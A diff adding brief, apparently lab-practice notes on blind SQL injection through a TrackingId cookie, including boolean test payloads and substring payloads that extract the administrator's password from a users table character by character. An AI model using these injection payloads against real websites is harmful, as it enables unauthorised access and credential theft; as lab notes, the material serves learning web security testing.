@@ -1,0 +1,11 @@
+in the request i found a cookie named TrackingId:
+1. when TrackingId=saSMWxiLxFjpqCgC'+and+'1'='1  ==> welcome back is there 
+   when TrackingId=saSMWxiLxFjpqCgC'+and+'1'='2  ==> welcome back disappears
+==> there is Blind SQL injection 
+
+2. test case:
+    - TrackingId=saSMWxiLxFjpqCgC'+and+substring(select+password+from+users+where+username+%3d+'administrator',1,1)+>+'m
+    ==> first caracter isnt greater then m
+    - TrackingId=saSMWxiLxFjpqCgC'+and+substring(select+password+from+users+where+username+%3d+'administrator',1,1)+>+'a
+    ==> not greater then a
+    -'+and+substring(select+'a'+from+users+where+username+%3d+'administrator',1,1)+=+'a'#
